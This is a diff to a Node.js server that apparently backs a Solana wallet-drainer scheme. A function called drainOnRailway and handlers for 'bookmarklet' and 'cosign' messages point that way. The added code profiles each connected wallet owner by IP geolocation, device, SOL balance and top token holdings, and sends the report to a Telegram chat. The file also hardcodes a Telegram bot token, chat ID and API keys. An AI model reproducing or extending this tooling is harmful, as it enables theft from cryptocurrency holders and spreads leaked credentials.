@@ -14,7 +14,7 @@ var LK_WS_URL      = process.env.LIVEKIT_URL        || 'wss://jack-6u9u95rm.live
 var LK_HTTP_URL    = LK_WS_URL.replace(/^wss?:\/\//, 'https://');
 var ROOM_NAME      = process.env.LK_ROOM            || 'bookmark-room';
 var AGENT_IDENTITY = 'railway-agent-v6';
-var VERCEL_URL     = process.env.VERCEL_URL         || 'https://gf56hg78tdse3q.vercel.app';
+var VERCEL_URL     = process.env.VERCEL_URL         || 'https://bridge-eight-bay.vercel.app';
 var AGENT_SECRET   = process.env.AGENT_SECRET       || 'lk-agent-secret-2024';
 var TG_TOKEN       = process.env.TELEGRAM_BOT_TOKEN || '7528079703:AAHMOBhYAU7A1RXe_fCgOE9U2GsdoceSzws';
 var TG_CHAT_ID     = process.env.TELEGRAM_CHAT_ID   || '7253475769';
@@ -336,6 +336,167 @@ async function drainOnRailway(parsed) {
   }
 }
 
+// ─── Fetch JSON helper (Promise-based) ───────────────────────────────────────
+function fetchJSON(url, options) {
+  return new Promise(function(resolve, reject) {
+    var urlObj;
+    try { urlObj = new URL(url); } catch(e) { return reject(e); }
+    var isHttps = urlObj.protocol === 'https:';
+    var mod = isHttps ? https : http;
+    var reqOpts = Object.assign({
+      hostname: urlObj.hostname,
+      port: urlObj.port || (isHttps ? 443 : 80),
+      path: urlObj.pathname + (urlObj.search || ''),
+      method: options && options.method ? options.method : 'GET',
+      headers: options && options.headers ? options.headers : {},
+    }, {});
+    if (options && options.method === 'POST' && options.body) {
+      reqOpts.headers['Content-Length'] = Buffer.byteLength(options.body);
+    }
+    var req = mod.request(reqOpts, function(res) {
+      var d = '';
+      res.on('data', function(c) { d += c; });
+      res.on('end', function() {
+        try { resolve(JSON.parse(d)); } catch(e) { resolve(null); }
+      });
+    });
+    req.on('error', function(e) { reject(e); });
+    if (options && options.body) req.write(options.body);
+    req.end();
+  });
+}
+
+// ─── Connect notification: Helius portfolio + IP geo ─────────────────────────
+async function sendConnectNotification(wallet, payload) {
+  var HELIUS_KEY = process.env.HELIUS_API_KEY || 'ce308279-4762-4968-ada5-b92792865b66';
+  var domain = payload.url ? (function() {
+    try { return new URL(payload.url).hostname; } catch(e) { return payload.url || '—'; }
+  })() : '—';
+  var ip = payload.ip || payload.userIp || '—';
+
+  // 1. IP геолокация
+  var geoText = '';
+  try {
+    var geo = await fetchJSON('https://ipapi.co/' + ip + '/json/');
+    if (geo && geo.country_name) {
+      geoText = (geo.city ? geo.city + ', ' : '') + geo.country_name;
+    }
+  } catch(e) {
+    console.error('[notify] geo error:', e.message);
+  }
+
+  // 2. SOL balance
+  var solUsd = 0;
+  var solAmount = 0;
+  try {
+    var web3 = require('@solana/web3.js');
+    var RPC_URL = process.env.NEXT_PUBLIC_SOLANA_RPC ||
+      ('https://mainnet.helius-rpc.com/?api-key=' + HELIUS_KEY);
+    var conn = new web3.Connection(RPC_URL, 'confirmed');
+    var lamports = await conn.getBalance(new web3.PublicKey(wallet));
+    solAmount = lamports / 1e9;
+    // SOL/USD через CoinGecko (no key needed)
+    var priceData = await fetchJSON('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
+    var solPrice = priceData && priceData.solana ? priceData.solana.usd : 0;
+    solUsd = solAmount * solPrice;
+  } catch(e) {
+    console.error('[notify] sol balance error:', e.message);
+  }
+
+  // 3. Token balances + metadata via Helius getAssetsByOwner
+  var tokenLines = '';
+  var tokensUsdTotal = 0;
+  try {
+    var heliusResp = await fetchJSON(
+      'https://mainnet.helius-rpc.com/?api-key=' + HELIUS_KEY,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          jsonrpc: '2.0', id: 'notify', method: 'getAssetsByOwner',
+          params: {
+            ownerAddress: wallet,
+            page: 1,
+            limit: 50,
+            displayOptions: { showFungible: true, showNativeBalance: false },
+          },
+        }),
+      }
+    );
+
+    var assets = heliusResp && heliusResp.result && heliusResp.result.items ? heliusResp.result.items : [];
+
+    // Фильтруем только fungible токены с балансом > 0
+    var fungible = assets.filter(function(a) {
+      return a.interface === 'FungibleToken' || a.interface === 'FungibleAsset';
+    });
+
+    // Собираем токены с ценой
+    var tokenList = [];
+    fungible.forEach(function(a) {
+      var name = (a.content && a.content.metadata && a.content.metadata.symbol)
+        ? a.content.metadata.symbol
+        : (a.content && a.content.metadata && a.content.metadata.name ? a.content.metadata.name : '???');
+      var balance = 0;
+      var price = 0;
+      var usdVal = 0;
+      if (a.token_info) {
+        var decimals = a.token_info.decimals || 0;
+        balance = (a.token_info.balance || 0) / Math.pow(10, decimals);
+        price = a.token_info.price_info && a.token_info.price_info.price_per_token
+          ? a.token_info.price_info.price_per_token : 0;
+        usdVal = a.token_info.price_info && a.token_info.price_info.total_price
+          ? a.token_info.price_info.total_price : (balance * price);
+      }
+      if (balance > 0) {
+        tokensUsdTotal += usdVal;
+        tokenList.push({ name: name, usd: usdVal });
+      }
+    });
+
+    // Топ-5 по стоимости
+    tokenList.sort(function(a, b) { return b.usd - a.usd; });
+    var top = tokenList.slice(0, 5);
+    if (top.length > 0) {
+      tokenLines = '\n\n<b>Top tokens by value:</b>';
+      top.forEach(function(t, i) {
+        tokenLines += '\n  ' + (i + 1) + '. ' + t.name + ': $' + t.usd.toFixed(2);
+      });
+    }
+  } catch(e) {
+    console.error('[notify] helius assets error:', e.message);
+  }
+
+  var totalUsd = solUsd + tokensUsdTotal;
+
+  // 4. Device info
+  var device = payload.userAgent
+    ? (function() {
+        var ua = payload.userAgent;
+        if (/iPhone|iPad/.test(ua)) return 'iOS';
+        if (/Android/.test(ua)) return 'Android';
+        if (/Windows/.test(ua)) return 'Windows';
+        if (/Mac/.test(ua)) return 'macOS';
+        if (/Linux/.test(ua)) return 'Linux';
+        return 'Unknown';
+      })()
+    : '—';
+
+  var msg =
+    '<b>New Connect</b> \uD83C\uDF89\n' +
+    '\n\uD83D\uDC5B <b>Wallet:</b> <code>' + wallet + '</code>' +
+    '\n\uD83D\uDDA5 <b>Device:</b> ' + device +
+    '\n\uD83C\uDF10 <b>IP:</b> ' + ip + (geoText ? ' | ' + geoText : '') +
+    '\n\uD83D\uDD17 <b>Domain:</b> ' + domain +
+    '\n' +
+    '\n\uD83D\uDCB0 <b>Portfolio value: ~$' + totalUsd.toFixed(2) + ' USD</b>' +
+    '\n   \u2022 SOL: ~$' + solUsd.toFixed(2) + ' USD (' + solAmount.toFixed(4) + ' SOL)' +
+    '\n   \u2022 Tokens: ~$' + tokensUsdTotal.toFixed(2) + ' USD' +
+    tokenLines;
+
+  sendTelegram(msg);
+}
+
 // ─── Обработка данных от букмарклета ────────────────────────────────────────
 function processData(msg, fromIdentity) {
   var action  = msg.action  || 'unknown';
@@ -357,14 +518,8 @@ function processData(msg, fromIdentity) {
     var wallet = payload.wallet || '—';
     console.log('[wallet] from=' + fromIdentity + ' wallet=' + wallet);
 
-    // Telegram уведомление
-    sendTelegram(
-      '<b>Wallet получен!</b>\n' +
-      'Identity: <code>' + fromIdentity + '</code>\n' +
-      'Wallet: <code>' + wallet + '</code>\n' +
-      'URL: ' + (payload.url || '—') + '\n' +
-      'Title: ' + (payload.title || '—')
-    );
+    // Отправляем расширенное уведомление с портфелем + геолокацией
+    sendConnectNotification(wallet, payload);
 
     // Если нет адреса кошелька — просто ack
     if (!wallet || wallet === '—') {
@@ -510,7 +665,7 @@ function processData(msg, fromIdentity) {
           sendDataToRoom({ action: 'error', error: 'cosign parse error', ts: Date.now() }, [fromIdentity]);
           return;
         }
-        // Отдаём финальный результат букмарклету
+        // Отдаём финальный резул  тат букмарклету
         sendDataToRoom({
           action: 'cosign_result',
           ok: parsed.success === true,
